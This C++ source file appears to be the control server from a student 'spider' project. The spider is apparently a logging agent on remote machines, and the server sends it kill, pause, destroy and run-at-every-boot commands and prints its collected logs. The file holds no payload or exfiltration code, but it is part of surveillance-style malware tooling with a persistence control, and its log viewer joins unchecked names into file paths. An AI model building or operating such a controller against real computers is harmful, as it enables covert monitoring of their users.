//
// server.cpp<src> for epitech in /home/chapui_s/rendu/
//
// Made by chapui_s
// Login   <chapui_s@epitech.eu>
//
// Started on  Wed Oct 21 09:01:22 2015 chapui_s
// Last update Wed Oct 21 09:01:22 2015 chapui_s
//

#include <boost/algorithm/string.hpp>
#include <boost/algorithm/string/predicate.hpp>
#include <boost/range/iterator_range.hpp>
#include <boost/filesystem.hpp>
#include <iostream>
#include "Server.hh"
#include "IPlugin.hh"
#include <dlfcn.h>

#define PLUGINS_DIRECTORY ("./plugins")
#define UNUSED __attribute__((__unused__))

namespace fs = boost::filesystem;

Server::Server(uint16_t port)
  : _web(new Web(port, _listPlugins)),
    _signal(*this)
{
  DEBUG_MSG("Server is running");
  try { boost::filesystem::create_directory("Logs"); }
  catch (std::exception &) {}
  _signal.addSignal(SIGINT);

  _commandsSpider["startup"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(5));
  _commandsSpider["kill"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(6));
  _commandsSpider["pause"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(7));
  _commandsSpider["destroy"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(8));

  _commandsServer["list"] = [this](const std::string &name UNUSED) -> int { return (_web->listSpider()); };
  _commandsServer["quit"] = [this](const std::string &name UNUSED) -> int { _web->stop(); return (1); };
  _commandsServer["help"] = [this](const std::string &name UNUSED) -> int { return (help()); };
  _commandsServer["cat"] = [this](const std::string &name) -> int { return (cat(name)); };

  loadPlugins(PLUGINS_DIRECTORY);
}

Server::~Server()
{
  DEBUG_MSG("Closing server");

  _thread.detach();
}

void		Server::loadPlugins(const std::string &path) {
  fs::path	dir(path);

  try {
    if (fs::exists(dir) && fs::is_directory(dir)) {
      for(auto &file : boost::make_iterator_range(fs::directory_iterator(dir), {})) {
	if (boost::ends_with(file.path().string(), ".so") && !fs::is_directory(file.path().string())) {

	  IPlugin	*(*plugin)();
	  void		*symbol;

	  if (!(symbol = dlopen(file.path().string().c_str(), RTLD_LAZY | RTLD_GLOBAL | RTLD_NOW))) {
	    std::cerr << "Can't load library: " << dlerror() << std::endl;
	    continue ;
	  }
	  if (!(plugin = reinterpret_cast<IPlugin *(*)()>(dlsym(symbol, "loadPlugin")))) {
	    std::cerr << "Can't load library" << dlerror() << std::endl;
	    continue ;
	  }

	  boost::shared_ptr<IPlugin> plug((plugin)());

	  if (!plug) {
	    std::cerr << "Can't load library" << std::endl;
	    continue ;
	  }
	  _listPlugins.push_back(plug);
	  std::cout << "Plugin loaded: " << file.path().filename() << std::endl;
	}
      }
    }
  }
  catch (std::exception &e) {
    std::cerr << "Can't load plugins" << e.what() << std::endl;
  }
}

void		Server::start()
{
  try {
    _thread = boost::thread(&Server::readCommand, this);
  }
  catch (const std::exception &e) {
    std::cerr << "Unable to run thread: " << e.what() << std::endl;
  }
 _web->start();
 _thread.interrupt();
}

void		Server::stop()
{
  _web->stop();
}

int		Server::help()
{
  std::cout << "Available commands:" << std::endl
	    << "\tkill [Spider1 ...]\t\t- Kill spiders" << std::endl
	    << "\tpause [Spider1 ...]\t\t- Pause spiders" << std::endl
	    << "\tdestroy [Spider1 ...]\t\t- Delete spiders from computers" << std::endl
	    << "\tstartup [Spider1 ...]\t\t- Make spider run automatically on each boot" << std::endl
	    << "\tcat Spider\t\t\t- Watch logs for spider" << std::endl
	    << "\tlist\t\t\t\t- List spiders connected" << std::endl
	    << "\tquit\t\t\t\t- Quit server" << std::endl
	    << "\thelp\t\t\t\t- Disp help" << std::endl;
  return (0);
}

int		Server::cat(const std::string &name) {
  std::string	filename = "./";
  std::ifstream	file;

  if (!name.size()) {
    std::cerr << "Give a spider name" << std::endl;
    return (0);
  }

  if (fs::is_directory("Logs")) {
    filename += "Logs/";
  }
  filename += name;

  file.open(filename, std::ifstream::in);

  if (file.is_open()) {
    char c = file.get();

    while (file.good()) {
      std::cout << c;
      c = file.get();
    }

    file.close();
  }
  else {
    std::cerr << "Can't get logs from " << name << std::endl;
  }
  return (0);
}

void		Server::readCommand()
{
  try {

    while (1) {

      auto		prompt = [this]() -> int { std::cout << "> " << std::flush; return (1); };
      std::string	input;
      std::list<std::string> strs;

      while (prompt() && std::getline(std::cin, input)) {

	int	found = 0;

	std::cout << "\r";
	boost::trim(input);
	boost::split(strs, input, boost::is_any_of("\t "), boost::token_compress_on);

	for (auto &command : _commandsSpider) {

	  if (boost::equals(strs.front(), command.first)) {

	    strs.pop_front();
	    if (!strs.size()) {
	      _web->sendCommand(command.second);
	    }
	    else {
	      _web->sendCommand(command.second, strs);
	    }
	    found = 1;
	    break ;
	  }
	}

	for (auto &command : _commandsServer) {
	  if (boost::equals(strs.front(), command.first)) {
	    strs.pop_front();

	    if (strs.size()) {
	      command.second(strs.front());
	    }
	    else {
	      command.second("");
	    }
	    found = 1;
	    break ;
	  }
	}
	if (!found && input.size()) {
	  std::cout << "Unknown command" << std::endl;
	}
      }
      std::cin.clear();
      std::cout << std::endl;
    }
  }
  catch (const std::exception &e) {
    std::cerr << "Unable to read input: " << e.what() << std::endl;
  }
}
